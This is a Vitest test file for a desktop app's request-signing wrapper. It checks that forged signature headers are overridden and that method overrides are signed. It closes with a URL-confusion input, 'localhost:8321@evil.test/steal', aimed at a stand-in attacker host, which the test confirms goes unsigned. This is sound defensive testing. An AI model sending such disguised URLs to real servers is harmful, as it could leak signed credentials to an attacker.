// @vitest-environment jsdom
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const invokeMock = vi.hoisted(() => vi.fn());

vi.mock('../stores/useAuthStore', () => ({
  useAuthStore: {
    getState: () => ({
      licenseKey: 'LICENSE-KEY',
      licenseToken: 'license-token',
    }),
  },
}));

import { authenticatedFetch, installBackendFetchAuth } from './api';

describe('API request authentication', () => {
  beforeEach(() => {
    invokeMock.mockReset();
    invokeMock.mockResolvedValue({
      'X-PrynX-Signature': 'trusted-signature',
      'X-PrynX-Timestamp': '123',
    });
    window.__TAURI_INTERNALS__ = {};
    window.__PRYNX_INVOKE__ = invokeMock as typeof window.__PRYNX_INVOKE__;
  });

  afterEach(() => {
    delete window.__TAURI_INTERNALS__;
    delete window.__PRYNX_INVOKE__;
    vi.unstubAllGlobals();
  });

  it('does not let caller headers replace native authentication headers', async () => {
    const fetchMock = vi.fn(async () => new Response(null, { status: 204 }));
    vi.stubGlobal('fetch', fetchMock);

    await authenticatedFetch('http://localhost:8321/api/secure', {
      method: 'POST',
      headers: {
        'X-PrynX-Signature': 'forged-signature',
        'X-Custom': 'kept',
      },
    });

    const init = fetchMock.mock.calls[0][1] as RequestInit;
    const headers = new Headers(init.headers);
    expect(headers.get('X-PrynX-Signature')).toBe('trusted-signature');
    expect(headers.get('X-Custom')).toBe('kept');
    expect(invokeMock).toHaveBeenCalledWith('sign_api_request', expect.objectContaining({
      method: 'POST',
    }));
  });

  it('signs and sends the effective Request after init overrides', async () => {
    const transport = vi.fn(async () => new Response(null, { status: 204 }));
    vi.stubGlobal('fetch', transport);
    installBackendFetchAuth();

    const input = new Request('http://localhost:8321/api/secure', { method: 'GET' });
    await window.fetch(input, { method: 'POST', body: 'payload' });

    const sent = transport.mock.calls[0][0] as Request;
    expect(sent.method).toBe('POST');
    expect(await sent.text()).toBe('payload');
    expect(sent.headers.get('X-PrynX-Signature')).toBe('trusted-signature');
    expect(invokeMock).toHaveBeenCalledWith('sign_api_request', expect.objectContaining({
      method: 'POST',
    }));

    invokeMock.mockClear();
    await window.fetch('http://localhost:8321@evil.test/steal');
    expect(invokeMock).not.toHaveBeenCalled();
    expect(transport.mock.calls[1][0]).toBe('http://localhost:8321@evil.test/steal');
  });
});
